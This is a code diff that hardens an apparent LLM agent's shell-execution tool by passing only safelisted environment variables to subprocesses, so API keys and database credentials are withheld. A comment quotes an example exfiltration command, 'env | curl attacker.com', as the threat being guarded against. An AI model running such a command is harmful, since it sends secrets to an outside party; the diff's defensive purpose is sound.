@@ -108,9 +108,15 @@ class Exec(WorkspaceTool):
         if not cwd.is_dir():
             raise BadRequestError(f"workdir {args.workdir!r} is not a directory")
 
-        proc_env: dict[str, str] | None = None
+        # Build a minimal, explicit environment for the subprocess.
+        # Inheriting the API server's full environment via env=None would
+        # leak provider API keys and database credentials to whatever
+        # command an LLM-driven agent decides to run. We allow only a
+        # short list of variables required for shells / tools to function,
+        # plus whatever the workspace template supplied.
+        proc_env: dict[str, str] = _curated_subprocess_env()
         if self._env is not None:
-            proc_env = {**os.environ, **self._env}
+            proc_env.update(self._env)
         proc = await asyncio.create_subprocess_shell(
             args.command,
             cwd=str(cwd),
@@ -145,6 +151,52 @@ class Exec(WorkspaceTool):
                 "workdir": args.workdir,
             },
         )
+
+
+# ===========================================================================
+# Helpers
+# ===========================================================================
+
+
+# Variables we copy from the parent process when constructing the
+# subprocess environment. Anything outside this set (notably API keys,
+# DB credentials, and other application secrets) is dropped so an LLM
+# command like ``env | curl attacker.com`` cannot exfiltrate them.
+_ENV_PASSTHROUGH = frozenset({
+    "PATH",
+    "HOME",
+    "USER",
+    "USERNAME",
+    "LANG",
+    "LC_ALL",
+    "LC_CTYPE",
+    "TZ",
+    "TMPDIR",
+    "TEMP",
+    "TMP",
+    "PWD",
+    "SHELL",
+    "TERM",
+    # Windows-specific essentials.
+    "SystemRoot",
+    "SYSTEMROOT",
+    "ComSpec",
+    "COMSPEC",
+    "PATHEXT",
+    "WINDIR",
+    "USERPROFILE",
+    "APPDATA",
+    "LOCALAPPDATA",
+    "PROGRAMDATA",
+    "PROGRAMFILES",
+    "ProgramFiles",
+    "ProgramFiles(x86)",
+})
+
+
+def _curated_subprocess_env() -> dict[str, str]:
+    """Copy only the safelisted variables from the parent environment."""
+    return {k: v for k, v in os.environ.items() if k in _ENV_PASSTHROUGH}
 
 
 __all__ = ["Exec", "ExecArgs"]
